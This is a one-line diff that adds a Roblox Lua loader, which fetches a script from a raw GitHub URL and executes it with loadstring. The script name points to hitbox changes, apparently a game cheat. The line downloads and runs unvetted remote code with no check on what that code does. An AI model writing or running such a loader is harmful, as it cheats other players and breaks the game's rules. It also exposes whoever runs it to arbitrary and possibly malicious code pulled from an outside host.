@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/hitbox-changes-azure-latch-spam5-lfq7b2ulo4tpab.lua"))()
